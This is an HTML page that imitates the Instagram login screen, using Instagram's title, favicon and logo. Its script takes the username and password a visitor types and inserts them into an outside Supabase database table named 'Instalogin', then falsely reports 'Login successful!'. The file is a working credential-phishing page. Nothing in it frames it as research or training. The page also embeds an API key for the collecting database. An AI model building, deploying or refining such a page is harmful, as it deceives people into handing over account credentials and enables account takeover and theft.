<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d994069ab1.png">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .main-container { width: 350px; }
        .box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 10px 0;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo-container {
            margin: 22px auto 12px;
            /* Reliable SVG Logo */
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png');
            background-size: contain;
            background-repeat: no-repeat;
            width: 175px;
            height: 51px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        .form-inner { padding: 0 40px; margin-top: 24px; }
        input {
            width: 100%;
            height: 38px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px;
            font-size: 12px;
            margin-bottom: 6px;
            box-sizing: border-box;
        }
        .login-btn {
            width: 100%;
            background-color: #4cb5f9;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px 0;
            font-weight: 600;
            font-size: 14px;
            margin: 8px 0;
            cursor: pointer;
        }
        .divider { display: flex; align-items: center; margin: 15px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .line { flex: 1; height: 1px; background: #dbdbdb; }
        .or-text { margin: 0 18px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin: 10px 0; }
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; }
        .signup { font-size: 14px; padding: 15px 0; }
        .signup a { color: #0095f6; font-weight: 600; text-decoration: none; }
    </style>
</head>

<body>

<div class="main-container">
    <div class="box">
        <div class="logo-container"></div>
        <div class="form-inner">
            <input id="username" type="text" placeholder="Username">
            <input id="password" type="password" placeholder="Password">
            <button class="login-btn" onclick="submitForm()">Submit</button>            
            <div class="divider">
                <div class="line"></div>
                <div class="or-text">OR</div>
                <div class="line"></div>
            </div>
            
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot">Forgot password?</a>
        </div>
    </div>
    
    <div class="box signup">
        Don't have an account? <a href="#">Sign up</a>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>

<script>
    // Initialize Supabase Client FIRST (before using it)
    const supabaseClient = supabase.createClient(
        "https://rzerpafnvkbiwzvpaccq.supabase.co",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ6ZXJwYWZudmtiaXd6dnBhY2NxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM1OTYyMTgsImV4cCI6MjA4OTE3MjIxOH0.wDQ5koxGrUyn-RKobBM_BgCfpjyhdZzFvX[...]"
    );

    // Define function AFTER client initialization
    async function submitForm() {
        let username = document.getElementById("username").value;
        let password = document.getElementById("password").value;

        // Validate inputs
        if (!username || !password) {
            alert("Please enter both username and password");
            return;
        }

        console.log("Submitting:", username, password);

        try {
            const { data, error } = await supabaseClient
                .from("Instalogin")
                .insert([
                    {
                        Username: username,
                        Password: password
                    }
                ]);

            if (error) {
                console.error("Supabase Error:", error);
                alert("Insert failed: " + error.message);
            } else {
                console.log("Data inserted successfully:", data);
                alert("Login successful!");
                // Clear inputs
                document.getElementById("username").value = "";
                document.getElementById("password").value = "";
            }
        } catch (exception) {
            console.error("Exception:", exception);
            alert("An error occurred: " + exception.message);
        }
    }
</script>
    
</body>
</html>
